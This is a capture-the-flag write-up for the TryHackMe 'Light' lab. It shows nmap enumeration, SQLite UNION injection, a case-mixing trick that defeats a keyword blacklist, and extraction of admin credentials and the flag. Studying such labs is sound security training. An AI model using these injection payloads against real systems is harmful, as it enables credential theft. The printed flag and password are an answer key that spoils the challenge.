---
title: "Light - Web exploitation"
description: SQL injection, SQLITE injection, database vulnerability, bypass blacklist characters
tags: [CTF, THM, Web]
robots: index, follow
lang: en
break: true
---

# Light Writeup

[TOC]

## How it works

### 1. Enumeration step
First, we get the lab machine IP address: `10.49.133.75`. Then, I used the `nmap` command to inspect all ports and see if there are any suspicious services or web applications.

```bash
nmap -sC -sV -p- -T4 10.49.133.75
```

And here is the output:

```bash
Nmap scan report for 10.49.133.75
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c7:a3:75:b1:a7:ec:bd:df:17:59:5f:06:7d:06:cb:73 (RSA)
|   256 53:85:d6:db:4b:2a:f4:a5:2e:5d:b5:63:79:da:23:64 (ECDSA)
|_  256 e6:38:ea:42:9b:bf:9e:75:7e:21:17:5d:9c:c6:15:03 (ED25519)
1337/tcp  open     waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     Welcome to the Light database!
|     Please enter your username:
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     Welcome to the Light database!
|     Please enter your username: Username not found.
|_    Please enter your username:
31465/tcp filtered unknown
1 service unrecognized despite returning data. 
[... truncated fingerprint strings for readability ...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 590.48 seconds
```

I noticed that port `1337` is open. The challenge description also notifies us that we will only be working with the `light` database application by running a netcat command to connect to the database server.

From that, I tried to connect to the database server using netcat:
```bash
nc 10.49.133.75 1337
```
This custom database application could potentially be vulnerable to SQL injection (a typical vulnerability for database servers).

## The Problem

- Getting access to the database application, we see it requires user input for a `username`. The challenge gives us a default username: `smokey`.
- This is the result when I input the `smokey` username, along with other common usernames like `admin`, `root`, `administrator`, etc.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc 10.49.133.75 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: admin
Username not found.
Please enter your username: root
Username not found.
Please enter your username: administrator
Username not found.
Please enter your username: 
```

From here, we can deduce the main logic: the application checks the database and returns the password for the username we type in. If it doesn't exist, it prints "Username not found."

The core SQL logic for the `Light` database application likely looks something like this:
```sql
SELECT password FROM '${table_name}' WHERE username = '${input}' 
```
There could also be a condition that handles cases where the username does not exist in the table (returning `NULL`).

### SQL Injection Detected

Now, let's see if it is vulnerable to SQL injection by typing a `'` character to trigger a syntax error in the SQL query.

**Output:**
```bash
Error: unrecognized token: "''' LIMIT 30"
```
This is a very useful result! It confirms that the application accepts and processes our `'` character directly into the database query.

Next, let's try to identify the database management system (DBMS) for better investigation. We need to close the string with `'` and use a `UNION` based query.

**New query:**
```sql
' UNION SELECT sqlite_version()--
```

**Output:**
```bash
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

I also tested some specific SQL keywords:
```bash
Please enter your username: UNION 
Ahh there is a word in there I don't like :(
Please enter your username: SELECT
Ahh there is a word in there I don't like :(
```

Now we can figure out that the application is using a blacklist to filter out characters/words like `--`, `/*`, `UNION`, and `SELECT`.

Therefore, I had to recreate the payload to bypass this blacklist. I noticed that we could bypass the keyword filter by mixing uppercase and lowercase letters (e.g., `Union Select`). Also, instead of using comments (`--`) which are blocked, I could add a `WHERE` condition that always evaluates to true (like `'1'='1`) to close the query cleanly.

**New query:**
```sql
' Union Select sqlite_version() where '1'='1
```

**Output:**
```bash
Please enter your username: ' Union Select sqlite_version() where '1'='1
Password: 3.31.1
```

It accepted the payload and returned the SQL database server version!

> **Success:**
> This is a SQLite injection. We can now manipulate the query to extract tables and columns.

## Attacking Chain

First, let's identify the table names in the `Light` database.

**Query:**
```sql
' Union Select tbl_name FROM sqlite_master WHERE type='table' and '1'='1
```

**Output:**
```bash
Please enter your username: ' Union Select tbl_name FROM sqlite_master WHERE type='table' and '1'='1
Password: admintable
```
==> We got the main table name: `admintable`.

Next, let's check out the column names inside the `admintable` table.

**Query:**
```sql
' Union Select sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='admintable' and '1'='1
```

**Output:**
```bash
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

This is a great sign. We have successfully identified all the important attributes in `admintable`. We just need to extract all the usernames and their corresponding passwords from this table.

**Final payload for extraction:**
```sql
' Union Select group_concat(username || ':' || password) from admintable where '1'='1
```
- We used `group_concat` to extract all the rows.
- We used the concatenation operator (`||`) to format the output as `username:password`.
- This is important because the original query only selects exactly 1 column value, so we must combine our results into a single string.

**Output:**
```bash
Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17,flag:THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

> **Success:**
> We have found not only the admin account's username and password, but the flag is there too!

---

- **Flag:** `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`
- **Author:** @Kkhao
- **Solved:** 28/10/2026